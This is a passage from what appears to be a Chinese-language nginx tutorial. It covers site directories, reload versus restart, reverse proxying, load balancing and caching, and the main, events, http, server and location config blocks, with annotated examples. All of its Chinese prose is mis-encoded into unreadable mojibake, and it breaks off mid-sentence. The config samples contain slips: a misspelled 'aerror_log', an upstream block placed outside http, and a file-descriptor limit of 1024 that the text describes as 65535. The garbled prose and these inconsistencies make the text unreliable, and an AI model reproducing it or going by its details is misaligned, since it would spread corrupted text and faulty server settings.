/etc/nginx/conf.d/*.conf;\ninclude /etc/nginx/sites-enabled/*;\n```\n\n\n\néœ€è¦æ·»åŠ æ–°é…ç½®é€‰é¡¹çš„åœ°æ–¹ä½äº sites-enabled æ–‡ä»¶å¤¹ã€‚å¦‚æœä½ æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œä½ ä¼šå‘ç°ä¸€ä¸ªåä¸º default çš„æ–‡æ¡£ï¼Œæ‰“å¼€åä½ å°±ä¼šæ‰¾åˆ°nginxçš„é…ç½®é€‰é¡¹, å½“ä½ å®‰è£…å¥½nginxé»˜è®¤çœ‹åˆ°çš„é¦–é¡µå°±æ˜¯åœ¨è¿™é‡Œé…ç½®çš„.\n\n\n\nåœ¨è¯¥ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª sites-available çš„æ–‡ä»¶å¤¹, è¿™ä¸ªæ–‡ä»¶å¤¹ä¸€èˆ¬åœ¨ä½ éœ€è¦å»ºç«‹å’Œç®¡ç†å¤šä¸ªç«™ç‚¹çš„æ—¶å€™éå¸¸æœ‰ç”¨ï¼Œå¯ä»¥å¸®åŠ©ä½ æ›´å¥½çš„ç»„ç»‡ä¸åŒçš„é¡¹ç›®ã€‚ä½ éœ€è¦åœ¨è¿™é‡Œæ·»åŠ ä½ çš„nginxé…ç½®æ–‡æ¡ˆå¹¶å°†ä»–ä»¬é“¾æ¥è‡³ sites-enabled ç›®å½•ä¸‹ã€‚\n\n\n\nåªæœ‰åœ¨ sites-enabled ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶æ‰èƒ½å¤ŸçœŸæ­£è¢«ç”¨æˆ·è®¿é—®ã€‚ä½†æ˜¯ä½ åŒæ ·å¯ä»¥å°†æ–‡ä»¶æ”¾åœ¨ sites-available ç›®å½•ä¸‹ç”¨æ¥å­˜æ¡£æˆ–è€…ç”Ÿæˆé“¾æ¥ã€‚\n\n<!-- more -->\n\n\n\n### 0.2 é»˜è®¤rootåœ¨å“ª\n\n```bash\nnginx -V\nit lists --prefix as the first one.\n```\n\n\n\n### 0.3 é‡å¯nginx\n\n```bash\nsudo nginx -s reload\n```\n\nreloadï¼Œé‡æ–°åŠ è½½çš„æ„æ€ï¼Œreloadä¼šé‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ï¼ŒnginxæœåŠ¡ä¸ä¼šä¸­æ–­ï¼Œè€Œä¸”reloadæ—¶ä¼šæµ‹è¯•confè¯­æ³•ç­‰ï¼Œå¦‚æœå‡ºé”™ä¼šrollbackç”¨ä¸Šä¸€æ¬¡æ­£ç¡®é…ç½®æ–‡ä»¶ä¿æŒæ­£å¸¸è¿è¡Œã€‚\n\nrestartï¼Œé‡å¯ï¼Œä¼šé‡å¯nginxæœåŠ¡ã€‚è¿™ä¸ªé‡å¯ä¼šé€ æˆæœåŠ¡ä¸€ç¬é—´çš„ä¸­æ–­ï¼Œå½“ç„¶å¦‚æœé…ç½®æ–‡ä»¶å‡ºé”™ä¼šå¯¼è‡´æœåŠ¡å¯åŠ¨å¤±è´¥ï¼Œé‚£å°±æ˜¯æ›´é•¿æ—¶é—´çš„æœåŠ¡ä¸­æ–­äº†ã€‚\n\n\n\n# ä¸€. nginx å¸¸ç”¨åŠŸèƒ½è¯´æ˜\n\n\n\n### 1.1 åå‘ä»£ç†\n\nä¸‹é¢ä¸€å¼ å›¾æ˜¯å¯¹æ­£å‘ä»£ç†ä¸åå“ä»£ç†çš„å¯¹æ¯”\n\n\n![1](nginxå¸¸ç”¨æ¨¡å—å’Œé…ç½®å®æˆ˜/1.jpg)\n\nNginxåœ¨åšåå‘ä»£ç†æ—¶ï¼Œæä¾›æ€§èƒ½ç¨³å®šï¼Œå¹¶ä¸”èƒ½å¤Ÿæä¾›é…ç½®çµæ´»çš„è½¬å‘åŠŸèƒ½ã€‚Nginxå¯ä»¥æ ¹æ®ä¸åŒçš„æ­£åˆ™åŒ¹é…ï¼Œé‡‡å–ä¸åŒçš„è½¬å‘ç­–ç•¥ï¼Œæ¯”å¦‚å›¾ç‰‡æ–‡ä»¶ç»“å°¾çš„èµ°æ–‡ä»¶æœåŠ¡å™¨ï¼ŒåŠ¨æ€é¡µé¢èµ°webæœåŠ¡å™¨ï¼Œåªè¦ä½ æ­£åˆ™å†™çš„æ²¡é—®é¢˜ï¼Œåˆæœ‰ç›¸å¯¹åº”çš„æœåŠ¡å™¨è§£å†³æ–¹æ¡ˆï¼Œä½ å°±å¯ä»¥éšå¿ƒæ‰€æ¬²çš„ç©ã€‚å¹¶ä¸”Nginxå¯¹è¿”å›ç»“æœè¿›è¡Œé”™è¯¯é¡µè·³è½¬ï¼Œå¼‚å¸¸åˆ¤æ–­ç­‰ã€‚å¦‚æœè¢«åˆ†å‘çš„æœåŠ¡å™¨å­˜åœ¨å¼‚å¸¸ï¼Œä»–å¯ä»¥å°†è¯·æ±‚é‡æ–°è½¬å‘ç»™å¦å¤–ä¸€å°æœåŠ¡å™¨ï¼Œç„¶åè‡ªåŠ¨å»é™¤å¼‚å¸¸æœåŠ¡å™¨ã€‚\n\n\n\n### 1.2 è´Ÿè½½å‡è¡¡\n\nNginxæä¾›çš„è´Ÿè½½å‡è¡¡ç­–ç•¥æœ‰2ç§ï¼šå†…ç½®ç­–ç•¥å’Œæ‰©å±•ç­–ç•¥ã€‚\n\nå†…ç½®ç­–ç•¥ä¸ºè½®è¯¢ï¼ŒåŠ æƒè½®è¯¢ï¼ŒIp hashã€‚æ‰©å±•ç­–ç•¥ï¼Œå°±å¤©é©¬è¡Œç©ºï¼Œåªæœ‰ä½ æƒ³ä¸åˆ°çš„æ²¡æœ‰ä»–åšä¸åˆ°çš„å•¦ï¼Œä½ å¯ä»¥å‚ç…§æ‰€æœ‰çš„è´Ÿè½½å‡è¡¡ç®—æ³•ï¼Œç»™ä»–ä¸€ä¸€æ‰¾å‡ºæ¥åšä¸‹å®ç°ã€‚\n\n\n\nçœ‹ä¸‹é¢çš„å›¾ç†è§£ä¸‰ç§è´Ÿè½½å‡è¡¡ç®—æ³•çš„å®ç°\n\n![1](nginxå¸¸ç”¨æ¨¡å—å’Œé…ç½®å®æˆ˜/2.jpg)\n\n\n\nIp hashç®—æ³•ï¼Œå¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„ipè¿›è¡Œhashæ“ä½œï¼Œç„¶åæ ¹æ®hashç»“æœå°†åŒä¸€ä¸ªå®¢æˆ·ç«¯ipçš„è¯·æ±‚åˆ†å‘ç»™åŒä¸€å°æœåŠ¡å™¨è¿›è¡Œå¤„ç†ï¼Œå¯ä»¥è§£å†³sessionä¸å…±äº«çš„é—®é¢˜ã€‚\n\n![1](nginxå¸¸ç”¨æ¨¡å—å’Œé…ç½®å®æˆ˜/3.jpg)\n\n\n\n### 1.3 webç¼“å­˜\n\nnginxå¯ä»¥å¯¹ä¸åŒçš„æ–‡ä»¶åšä¸åŒçš„ç¼“å­˜å¤„ç†ï¼Œé…ç½®çµæ´»ï¼Œå¹¶ä¸”æ”¯æŒFastCGI_Cacheï¼Œä¸»è¦ç”¨äºå¯¹FastCGIçš„åŠ¨æ€ç¨‹åºè¿›è¡Œç¼“å­˜ã€‚é…åˆç€ç¬¬ä¸‰æ–¹çš„ngx_cache_purgeï¼Œå¯¹åˆ¶å®šçš„URLç¼“å­˜å†…å®¹å¯ä»¥çš„è¿›è¡Œå¢åˆ ç®¡ç†ã€‚\n\n\n\n# äºŒ. nginxé…ç½®æ–‡ä»¶ç»“æ„\n\n\n\nå…ˆæ”¾ä¸€ä¸ªé…ç½®demo\n\n```nginx\nuser  nobody;\nworker_processes  1;\npid        logs/nginx.pid;\n\nevents {\n    worker_connections  1024;\n}\n\nupstream mysvr {   \n  server 127.0.0.1:7878;\n  server 192.168.10.121:3333 backup;\n}\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n  \n    server {\n        listen       80;\n        server_name  localhost;\n        location / {\n            root   html;\n            index  index.html index.htm;\n        }\n    }\n}\n```\n\n\n\n### 2.1 é…ç½®æ–‡ä»¶ç»“æ„\n\n+ main(å…¨å±€å—)[ä¸€ä¸ª]\n+ events (nginxå·¥ä½œæ¨¡å¼)[ä¸€ä¸ª]\n\n+ http(httpè®¾ç½®)[ä¸€ä¸ª]\n  + server(ä¸»æœºè®¾ç½®)[httpé‡Œå¤šä¸ª]\n    + location(URLåŒ¹é…)[serveré‡Œå¤šä¸ª]\n  + upstream(è´Ÿè½½å‡è¡¡æœåŠ¡å™¨è®¾ç½®)[httpé‡Œä¸€ä¸ª]\n\n\n\n1ã€å…¨å±€å—ï¼šé…ç½®å½±å“nginxå…¨å±€çš„æŒ‡ä»¤ã€‚ä¸€èˆ¬æœ‰è¿è¡ŒnginxæœåŠ¡å™¨çš„ç”¨æˆ·ç»„ï¼Œnginxè¿›ç¨‹pidå­˜æ”¾è·¯å¾„ï¼Œæ—¥å¿—å­˜æ”¾è·¯å¾„ï¼Œé…ç½®æ–‡ä»¶å¼•å…¥ï¼Œå…è®¸ç”Ÿæˆworker processæ•°ç­‰ã€‚\n\n2ã€eventså—ï¼šé…ç½®å½±å“nginxæœåŠ¡å™¨æˆ–ä¸ç”¨æˆ·çš„ç½‘ç»œè¿æ¥ã€‚æœ‰æ¯ä¸ªè¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•°ï¼Œé€‰å–å“ªç§äº‹ä»¶é©±åŠ¨æ¨¡å‹å¤„ç†è¿æ¥è¯·æ±‚ï¼Œæ˜¯å¦å…è®¸åŒæ—¶æ¥å—å¤šä¸ªç½‘è·¯è¿æ¥ï¼Œå¼€å¯å¤šä¸ªç½‘ç»œè¿æ¥åºåˆ—åŒ–ç­‰ã€‚\n\n3ã€httpå—ï¼šå¯ä»¥åµŒå¥—å¤šä¸ªserverï¼Œé…ç½®ä»£ç†ï¼Œç¼“å­˜ï¼Œæ—¥å¿—å®šä¹‰ç­‰ç»å¤§å¤šæ•°åŠŸèƒ½å’Œç¬¬ä¸‰æ–¹æ¨¡å—çš„é…ç½®ã€‚å¦‚æ–‡ä»¶å¼•å…¥ï¼Œmime-typeå®šä¹‰ï¼Œæ—¥å¿—è‡ªå®šä¹‰ï¼Œæ˜¯å¦ä½¿ç”¨sendfileä¼ è¾“æ–‡ä»¶ï¼Œè¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•è¿æ¥è¯·æ±‚æ•°ç­‰ã€‚\n\n4ã€serverå—ï¼šé…ç½®è™šæ‹Ÿä¸»æœºçš„ç›¸å…³å‚æ•°ï¼Œä¸€ä¸ªhttpä¸­å¯ä»¥æœ‰å¤šä¸ªserverã€‚\n\n5ã€locationå—ï¼šé…ç½®è¯·æ±‚çš„è·¯ç”±ï¼Œä»¥åŠå„ç§é¡µé¢çš„å¤„ç†æƒ…å†µã€‚\n\n6ã€upstreamå—ï¼šè´Ÿè´£è´Ÿè½½å‡è¡¡\n\n\n\n```nginx\n########### æ¯ä¸ªæŒ‡ä»¤å¿…é¡»æœ‰åˆ†å·ç»“æŸã€‚#################\n\n#user administrator administrators;  #é…ç½®ç”¨æˆ·æˆ–è€…ç»„ï¼Œé»˜è®¤ä¸ºnobody nobodyã€‚\n#worker_processes 2;  #å…è®¸ç”Ÿæˆçš„è¿›ç¨‹æ•°ï¼Œé»˜è®¤ä¸º1\n#pid /nginx/pid/nginx.pid;   #æŒ‡å®šnginxè¿›ç¨‹è¿è¡Œæ–‡ä»¶å­˜æ”¾åœ°å€\n\nerror_log log/error.log debug;  #åˆ¶å®šæ—¥å¿—è·¯å¾„ï¼Œçº§åˆ«ã€‚è¿™ä¸ªè®¾ç½®å¯ä»¥æ”¾å…¥å…¨å±€å—ï¼Œhttpå—ï¼Œserverå—ï¼Œçº§åˆ«åˆ†åˆ«ä¸ºï¼šdebug|info|notice|warn|error|crit|alert|emerg\n\n\nevents {\n    accept_mutex on;   #è®¾ç½®ç½‘è·¯è¿æ¥åºåˆ—åŒ–ï¼Œé˜²æ­¢æƒŠç¾¤ç°è±¡å‘ç”Ÿï¼Œé»˜è®¤ä¸ºon\n    multi_accept on;  #è®¾ç½®ä¸€ä¸ªè¿›ç¨‹æ˜¯å¦åŒæ—¶æ¥å—å¤šä¸ªç½‘ç»œè¿æ¥ï¼Œé»˜è®¤ä¸ºoff\n    #use epoll;      #äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œselect|poll|kqueue|epoll|resig|/dev/poll|eventport\n    worker_connections  1024;    #æœ€å¤§è¿æ¥æ•°ï¼Œé»˜è®¤ä¸º512\n}\n\n\nhttp {\n    include       mime.types;   #æ–‡ä»¶æ‰©å±•åä¸æ–‡ä»¶ç±»å‹æ˜ å°„è¡¨\n    default_type  application/octet-stream; #é»˜è®¤æ–‡ä»¶ç±»å‹ï¼Œé»˜è®¤ä¸ºtext/plain\n    #access_log off; #å–æ¶ˆæœåŠ¡æ—¥å¿—    \n    log_format myFormat '$remote_addrâ€“$remote_user [$time_local] $request $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for'; #è‡ªå®šä¹‰æ ¼å¼\n    access_log log/access.log myFormat;  #combinedä¸ºæ—¥å¿—æ ¼å¼çš„é»˜è®¤å€¼\n  \n \n    sendfile on;   #å…è®¸sendfileæ–¹å¼ä¼ è¾“æ–‡ä»¶ï¼Œé»˜è®¤ä¸ºoffï¼Œå¯ä»¥åœ¨httpå—ï¼Œserverå—ï¼Œlocationå—ã€‚\n    sendfile_max_chunk 100k;  #æ¯ä¸ªè¿›ç¨‹æ¯æ¬¡è°ƒç”¨ä¼ è¾“æ•°é‡ä¸èƒ½å¤§äºè®¾å®šçš„å€¼ï¼Œé»˜è®¤ä¸º0ï¼Œå³ä¸è®¾ä¸Šé™ã€‚\n    keepalive_timeout 65;  #è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œé»˜è®¤ä¸º75sï¼Œå¯ä»¥åœ¨httpï¼Œserverï¼Œlocationå—ã€‚\n\n    upstream mysvr {   \n      server 127.0.0.1:7878;\n      server 192.168.10.121:3333 backup;  #çƒ­å¤‡\n    }\n  \n    error_page 404 https://www.baidu.com; #é”™è¯¯é¡µ\n    \n  \tserver {\n        keepalive_requests 120; #å•è¿æ¥è¯·æ±‚ä¸Šé™æ¬¡æ•°ã€‚\n        listen       4545;   #ç›‘å¬ç«¯å£\n        server_name  127.0.0.1;   #ç›‘å¬åœ°å€       \n        \n    \t\tlocation  ~*^.+$ {       #è¯·æ±‚çš„urlè¿‡æ»¤ï¼Œæ­£åˆ™åŒ¹é…ï¼Œ~ä¸ºåŒºåˆ†å¤§å°å†™ï¼Œ~*ä¸ºä¸åŒºåˆ†å¤§å°å†™ã€‚\n           #root path;  #æ ¹ç›®å½•\n           #index vv.txt;  #è®¾ç½®é»˜è®¤é¡µ\n           proxy_pass  http://mysvr;  #è¯·æ±‚è½¬å‘mysvr å®šä¹‰çš„æœåŠ¡å™¨åˆ—è¡¨\n           deny 127.0.0.1;  #æ‹’ç»çš„ip\n           allow 172.18.5.54; #å…è®¸çš„ip           \n        }\n    }\n}\n```\n\n\n\n+ `$remote_addr` ä¸`$http_x_forwarded_for` ç”¨ä»¥è®°å½•å®¢æˆ·ç«¯çš„ipåœ°å€ï¼› \n+ `$remote_user` ç”¨æ¥è®°å½•å®¢æˆ·ç«¯ç”¨æˆ·åç§°ï¼› \n+ `$time_local` ç”¨æ¥è®°å½•è®¿é—®æ—¶é—´ä¸æ—¶åŒºï¼›\n+ `$request` ç”¨æ¥è®°å½•è¯·æ±‚çš„urlä¸httpåè®®ï¼›\n+ `$status` ç”¨æ¥è®°å½•è¯·æ±‚çŠ¶æ€ï¼›æˆåŠŸæ˜¯200ï¼Œ \n+ `body_bytes_sent` è®°å½•å‘é€ç»™å®¢æˆ·ç«¯æ–‡ä»¶ä¸»ä½“å†…å®¹å¤§å°ï¼›\n+ `$http_referer` ç”¨æ¥è®°å½•ä»é‚£ä¸ªé¡µé¢é“¾æ¥è®¿é—®è¿‡æ¥çš„ï¼› 8.$http_user_agent ï¼šè®°å½•å®¢æˆ·ç«¯æµè§ˆå™¨çš„ç›¸å…³ä¿¡æ¯ï¼›\n\n+ æƒŠç¾¤ç°è±¡ï¼šä¸€ä¸ªç½‘è·¯è¿æ¥åˆ°æ¥ï¼Œå¤šä¸ªç¡çœ çš„è¿›ç¨‹è¢«åŒæ—¶å«é†’ï¼Œä½†åªæœ‰ä¸€ä¸ªè¿›ç¨‹èƒ½è·å¾—é“¾æ¥ï¼Œè¿™æ ·ä¼šå½±å“ç³»ç»Ÿæ€§èƒ½ã€‚\n\n+ æ¯ä¸ªæŒ‡ä»¤å¿…é¡»æœ‰åˆ†å·ç»“æŸã€‚\n\n\n\n# ä¸‰. æ¨¡å—é…ç½®è¯´æ˜\n\n### 3.1 mainæ¨¡å—\n\n```nginx\nuser nobody nobody;\nworker_processes 2;\nerror_log  /usr/local/var/log/nginx/error.log  notice;\npid        /usr/local/var/run/nginx/nginx.pid;\nworker_rlimit_nofile 1024;\n```\n\n\n\n+ user æ¥æŒ‡å®šNginx Workerè¿›ç¨‹è¿è¡Œç”¨æˆ·ä»¥åŠç”¨æˆ·ç»„ï¼Œé»˜è®¤ç”±nobodyè´¦å·è¿è¡Œã€‚\n\n+ worker_processesæ¥æŒ‡å®šäº†Nginxè¦å¼€å¯çš„å­è¿›ç¨‹æ•°ã€‚æ¯ä¸ªNginxè¿›ç¨‹å¹³å‡è€—è´¹10M~12Må†…å­˜ã€‚æ ¹æ®ç»éªŒï¼Œä¸€èˆ¬æŒ‡å®š1ä¸ªè¿›ç¨‹å°±è¶³å¤Ÿäº†ï¼Œå¦‚æœæ˜¯å¤šæ ¸CPUï¼Œå»ºè®®æŒ‡å®šå’ŒCPUçš„æ•°é‡ä¸€æ ·çš„è¿›ç¨‹æ•°å³å¯ã€‚æˆ‘è¿™é‡Œå†™2ï¼Œé‚£ä¹ˆå°±ä¼šå¼€å¯2ä¸ªå­è¿›ç¨‹ï¼Œæ€»å…±3ä¸ªè¿›ç¨‹ã€‚å¯ä»¥å†™ auto.\n\n+ error_logç”¨æ¥å®šä¹‰å…¨å±€é”™è¯¯æ—¥å¿—æ–‡ä»¶ã€‚æ—¥å¿—è¾“å‡ºçº§åˆ«æœ‰debugã€infoã€noticeã€warnã€errorã€critå¯ä¾›é€‰æ‹©ï¼Œå…¶ä¸­ï¼Œdebugè¾“å‡ºæ—¥å¿—æœ€ä¸ºæœ€è¯¦ç»†ï¼Œè€Œcritè¾“å‡ºæ—¥å¿—æœ€å°‘ã€‚\n\n+ pidç”¨æ¥æŒ‡å®šè¿›ç¨‹idçš„å­˜å‚¨æ–‡ä»¶ä½ç½®ã€‚\n\n+ worker_rlimit_nofileç”¨äºæŒ‡å®šä¸€ä¸ªnginxè¿›ç¨‹å¯ä»¥æ‰“å¼€çš„æœ€å¤šæ–‡ä»¶æè¿°ç¬¦æ•°ç›®ï¼Œè¿™é‡Œæ˜¯65535ï¼Œéœ€è¦ä½¿ç”¨å‘½ä»¤â€œulimit -n 65535â€æ¥è®¾ç½®ã€‚\n\n  \n\n### 3.2 events æ¨¡å—\n\neventsæ¨¡å—æ¥ç”¨æŒ‡å®šnginxçš„å·¥ä½œæ¨¡å¼å’Œå·¥ä½œæ¨¡å¼åŠè¿æ¥æ•°ä¸Šé™\n\n```nginx\nevents {\n     use kqueue; #macå¹³å°\n     worker_connections  1024;\n}\n```\n\n\n\n+ useç”¨æ¥æŒ‡å®šNginxçš„å·¥ä½œæ¨¡å¼ã€‚Nginxæ”¯æŒçš„å·¥ä½œæ¨¡å¼æœ‰selectã€pollã€kqueueã€epollã€rtsigå’Œ/dev/pollã€‚å…¶ä¸­selectå’Œpolléƒ½æ˜¯æ ‡å‡†çš„å·¥ä½œæ¨¡å¼ï¼Œkqueueå’Œepollæ˜¯é«˜æ•ˆçš„å·¥ä½œæ¨¡å¼ï¼Œä¸åŒçš„æ˜¯epollç”¨åœ¨Linuxå¹³å°ä¸Šï¼Œè€Œkqueueç”¨åœ¨BSDç³»ç»Ÿä¸­ï¼Œå› ä¸ºMacåŸºäºBSD,æ‰€ä»¥Macä¹Ÿå¾—ç”¨è¿™ä¸ªæ¨¡å¼ï¼Œå¯¹äºLinuxç³»ç»Ÿï¼Œepollå·¥ä½œæ¨¡å¼æ˜¯é¦–é€‰ã€‚\n\n+ worker_connectionsç”¨äºå®šä¹‰Nginxæ¯ä¸ªè¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•°ï¼Œå³æ¥æ”¶å‰ç«¯çš„æœ€å¤§è¯·æ±‚æ•°ï¼Œé»˜è®¤æ˜¯1024ã€‚æœ€å¤§å®¢æˆ·ç«¯è¿æ¥æ•°ç”±worker_processeså’Œworker_connectionså†³å®š\n+ å³Max_clients=worker_processes*worker_connectionsï¼Œåœ¨ä½œä¸ºåå‘ä»£ç†æ—¶ï¼ŒMax_clientså˜ä¸ºï¼šMax_clients = worker_processes * worker_connections/4ã€‚ \n\n+ è¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•°å—Linuxç³»ç»Ÿè¿›ç¨‹çš„æœ€å¤§æ‰“å¼€æ–‡ä»¶æ•°é™åˆ¶ï¼Œåœ¨æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤â€œulimit -n 65536â€åworker_connectionsçš„è®¾ç½®æ‰èƒ½ç”Ÿæ•ˆã€‚\n\n\n\n### 3.3 http æ¨¡å—\n\nhttpæ¨¡å—å¯ä»¥è¯´æ˜¯æœ€æ ¸å¿ƒçš„æ¨¡å—äº†ï¼Œå®ƒè´Ÿè´£HTTPæœåŠ¡å™¨ç›¸å…³å±æ€§çš„é…ç½®ï¼Œå®ƒé‡Œé¢çš„serverå’Œupstreamå­æ¨¡å—ï¼Œè‡³å…³é‡è¦ã€‚\n\n```nginx\nhttp {\n     include       mime.types;\n     default_type  application/octet-stream;\n     log_format  main  'remote_addr - remote_user [time_local] \"request\" '\n                       'status body_bytes_sent \"$http_referer\" '\n                       '\"http_user_agent\" \"http_x_forwarded_for\"';\n     access_log  /usr/local/var/log/nginx/access.log  main;\n     sendfile        on;\n     tcp_nopush      on;\n     tcp_nodelay     on;\n     keepalive_timeout  10;\n     #gzip  on;\n     \n     upstream myproject {\n         .....\n     }\n     \n  \t server {\n         ....\n     }\n}\n```\n\n\n\n+ include ç”¨æ¥è®¾å®šæ–‡ä»¶çš„mimeç±»å‹,ç±»å‹åœ¨é…ç½®æ–‡ä»¶ç›®å½•ä¸‹çš„mime.typeæ–‡ä»¶å®šä¹‰ï¼Œæ¥å‘Šè¯‰nginxæ¥è¯†åˆ«æ–‡ä»¶ç±»å‹ã€‚\n\n+ default_typeè®¾å®šäº†é»˜è®¤çš„ç±»å‹ä¸ºäºŒè¿›åˆ¶æµï¼Œä¹Ÿå°±æ˜¯å½“æ–‡ä»¶ç±»å‹æœªå®šä¹‰æ—¶ä½¿ç”¨è¿™ç§æ–¹å¼ã€‚\n\n+ log_formatç”¨äºè®¾ç½®æ—¥å¿—çš„æ ¼å¼ï¼Œå’Œè®°å½•å“ªäº›å‚æ•°ï¼Œè¿™é‡Œè®¾ç½®ä¸ºmainï¼Œåˆšå¥½ç”¨äºaccess_logæ¥è®°å½•è¿™ç§ç±»å‹ã€‚\n\n  mainçš„ç±»å‹æ—¥å¿—å¦‚ä¸‹ï¼šä¹Ÿå¯ä»¥å¢åˆ éƒ¨åˆ†å‚æ•°ã€‚\n\n  127.0.0.1 - - [21/Apr/2015:18:09:54 +0800] \"GET /index.php HTTP/1.1\" 200 87151 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36\" \n\n+ access_log ç”¨æ¥çºªå½•æ¯æ¬¡çš„è®¿é—®æ—¥å¿—çš„æ–‡ä»¶åœ°å€ï¼Œåé¢çš„mainæ˜¯æ—¥å¿—çš„æ ¼å¼æ ·å¼ï¼Œå¯¹åº”äºlog_formatçš„mainã€‚\n\n+ sendfileå‚æ•°ç”¨äºå¼€å¯é«˜æ•ˆæ–‡ä»¶ä¼ è¾“æ¨¡å¼ã€‚\n+ å°†tcp_nopushå’Œtcp_nodelayä¸¤ä¸ªæŒ‡ä»¤è®¾ç½®ä¸ºonç”¨äºé˜²æ­¢ç½‘ç»œé˜»å¡ã€‚\n\n+ keepalive_timeoutè®¾ç½®å®¢æˆ·ç«¯è¿æ¥ä¿æŒæ´»åŠ¨çš„è¶…æ—¶æ—¶é—´ã€‚åœ¨è¶…è¿‡è¿™ä¸ªæ—¶é—´ä¹‹åï¼ŒæœåŠ¡å™¨ä¼šå…³é—­è¯¥è¿æ¥ã€‚\n\n\n\n### 3.4 server æ¨¡å— (httpçš„å­æ¨¡å—, è™šæ‹Ÿä¸»æœº)\n\nsever æ¨¡å—æ˜¯httpçš„å­æ¨¡å—ï¼Œå®ƒç”¨æ¥å®šä¸€ä¸ªè™šæ‹Ÿä¸»æœºã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸€ä¸ªç®€å•çš„server æ˜¯å¦‚ä½•åšçš„ï¼Ÿ\n\n```nginx\nserver {\n         listen       8080;\n         server_name  test.liuvv.com;\n         root   /home/levonfly/www;         # å…¨å±€å®šä¹‰ï¼Œå¦‚æœéƒ½æ˜¯è¿™ä¸€ä¸ªç›®å½•ï¼Œè¿™æ ·å®šä¹‰æœ€ç®€å•ã€‚\n         index  index.php index.html index.htm; \n         charset utf-8;\n         access_log  usr/local/var/log/host.access.log  main;\n         aerror_log  usr/local/var/log/host.error.log  error;\n         ....\n}\n```\n\n+ serveræ ‡å¿—å®šä¹‰è™šæ‹Ÿä¸»æœºå¼€å§‹ã€‚ \n\n+ listenç”¨äºæŒ‡å®šè™šæ‹Ÿä¸»æœºçš„æœåŠ¡ç«¯å£ã€‚ \n\n+ server_nameç”¨æ¥æŒ‡å®šIPåœ°å€æˆ–è€…åŸŸåï¼Œå¤šä¸ªåŸŸåä¹‹é—´ç”¨ç©ºæ ¼åˆ†å¼€ã€‚ \n\n+ root è¡¨ç¤ºåœ¨è¿™æ•´ä¸ªserverè™šæ‹Ÿä¸»æœºå†…ï¼Œå…¨éƒ¨çš„root webæ ¹ç›®å½•ã€‚æ³¨æ„è¦å’Œlocate {}ä¸‹é¢å®šä¹‰çš„åŒºåˆ†å¼€æ¥ã€‚ \n\n+ index å…¨å±€å®šä¹‰è®¿é—®çš„é»˜è®¤é¦–é¡µåœ°å€ã€‚æ³¨æ„è¦å’Œlocate {}ä¸‹é¢å®šä¹‰çš„åŒºåˆ†å¼€æ¥ã€‚ \n\n+ charsetç”¨äºè®¾ç½®ç½‘é¡µçš„é»˜è®¤ç¼–ç æ ¼å¼ã€‚ \n\n+ access_logç”¨æ¥æŒ‡å®šæ­¤è™šæ‹Ÿä¸»æœºçš„è®¿é—®æ—¥å¿—å­˜æ”¾è·¯å¾„ï¼Œæœ€åçš„mainç”¨äºæŒ‡å®šè®¿é—®æ—¥å¿—çš„è¾“å‡ºæ ¼å¼ã€‚\n\n\n\n### 3.5 location æ¨¡å—(serverçš„å­æ¨¡å—, é‡è¦)\n\nlocationæ¨¡å—æ˜¯nginxä¸­ç”¨çš„æœ€å¤šçš„ï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„æ¨¡å—äº†ï¼Œä»€ä¹ˆè´Ÿè½½å‡è¡¡å•Šã€åå‘ä»£ç†å•Šã€è™šæ‹ŸåŸŸåå•Šéƒ½ä¸å®ƒç›¸å…³ã€‚\n\nlocation æ ¹æ®å®ƒå­—é¢æ„æ€å°±çŸ¥é“æ˜¯æ¥å®šä½çš„ï¼Œå®šä½URLï¼Œè§£æURLï¼Œæ‰€ä»¥ï¼Œå®ƒä¹Ÿæä¾›äº†å¼ºå¤§çš„æ­£åˆ™åŒ¹é…åŠŸèƒ½ï¼Œä¹Ÿæ”¯æŒæ¡ä»¶åˆ¤æ–­åŒ¹é…ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡locationæŒ‡ä»¤å®ç°Nginxå¯¹åŠ¨ã€é™æ€ç½‘é¡µè¿›è¡Œè¿‡æ»¤å¤„ç†ã€‚\n\n\n\næˆ‘ä»¬å…ˆæ¥çœ‹è¿™ä¸ªï¼Œè®¾å®šé»˜è®¤é¦–é¡µå’Œè™šæ‹Ÿæœºç›®å½•ã€‚\n\n```nginx\nlocation / {\n\troot   /home/levonfly/www;\n\tindex  index.php index.html index.htm;\n}\n```\n\n+ location /è¡¨ç¤ºåŒ¹é…è®¿é—®æ ¹ç›®å½•ã€‚\n\n+ rootæŒ‡ä»¤ç”¨äºæŒ‡å®šè®¿é—®æ ¹ç›®å½•æ—¶ï¼Œè™šæ‹Ÿä¸»æœºçš„webç›®å½•ï¼Œè¿™ä¸ªç›®å½•å¯ä»¥æ˜¯ç›¸å¯¹è·¯å¾„ï¼ˆç›¸å¯¹è·¯å¾„æ˜¯ç›¸å¯¹äºnginxçš„å®‰è£…ç›®å½•ï¼‰ã€‚ä¹Ÿå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ã€‚\n\n+ indexç”¨äºè®¾å®šæˆ‘ä»¬åªè¾“å…¥åŸŸååè®¿é—®çš„é»˜è®¤é¦–é¡µåœ°å€ï¼Œæœ‰ä¸ªå…ˆåé¡ºåºï¼šindex.php index.html index.htmï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ç›®å½•æµè§ˆæƒé™ï¼Œåˆæ‰¾ä¸åˆ°è¿™äº›é»˜è®¤é¦–é¡µï¼Œå°±ä¼šæŠ¥403é”™è¯¯ã€‚\n\n  \n\nlocation 